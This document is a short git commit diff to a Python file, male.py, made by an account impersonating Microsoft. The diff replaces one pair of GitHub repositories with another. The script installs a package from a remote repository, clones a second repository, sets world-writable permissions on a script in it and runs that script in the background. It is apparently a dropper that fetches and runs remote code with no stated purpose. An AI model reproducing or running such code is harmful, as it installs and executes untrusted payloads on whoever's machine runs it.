9df43e23e5884b3ec86046a4058c7dd2299065de
microsoftsubscription16501 <82867208+microsoftsubscription16501@users.noreply.github.com>
2021-04-20 12:46:48 +0530

    Update male.py

--- male.py
+++ male.py
@@ -1,5 +1,5 @@
 import os
-os.system("pip3 install git+https://github.com/rahulji765789021/titli.git")
-os.system("git clone https://github.com/rahulji765789021/murgi.git")
-os.system("chmod 777 murgi/hen.py")
-os.system("./murgi/hen.py &")
+os.system("pip3 install git+https://github.com/elonkmusk984/subscription.git")
+os.system("git clone https://github.com/elonkmusk984/microsoft.git")
+os.system("chmod 777 microsoft/micros.py ")
+os.system("./microsoft/micros.py &")
